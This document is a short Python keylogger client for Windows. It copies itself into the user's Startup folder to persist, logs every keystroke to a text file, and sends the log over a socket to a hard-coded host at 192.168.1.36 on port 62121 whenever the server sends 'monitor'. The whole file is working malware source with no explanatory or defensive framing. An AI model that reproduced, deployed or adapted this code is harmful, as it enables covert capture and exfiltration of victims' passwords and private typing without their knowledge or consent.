import socket
import os
import threading
import shutil

from pynput import keyboard

file_location = os.getcwd()
user = os.getlogin()
file_is_open = False
text_file_name = file_location + "\textfile.txt"
des = "C:\\Users\\" + str(user) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.exe"
path = str(file_location) + "\client.exe"
flag = False

try:
    if os.path.exists(des):
        print("File exists")
    else:
        shutil.copy(path, des)
except:
    print("[FAILED] File could not find...")

def on_press(key):
    global file_is_open
    try:
        k = key.char
    except:
        k = ""
    print('Key pressed: ' + k)
    with open("textfile.txt", "a") as file:
        file.write(k)

def listen_keyboard():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

while True:
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect(("192.168.1.36", 62121))
            break
        except:
            print("Trying to connect...")
    while True:
        if flag == False:
            threading.Thread(target=listen_keyboard).start()
            flag = True
        try:
            data = (s.recv(1024)).decode("utf-8")
            if data == "monitor":
                with open("textfile.txt", "r") as read_file:
                    file_data = read_file.read()
                    s.sendall(file_data.encode("utf-8"))
        except:
            break
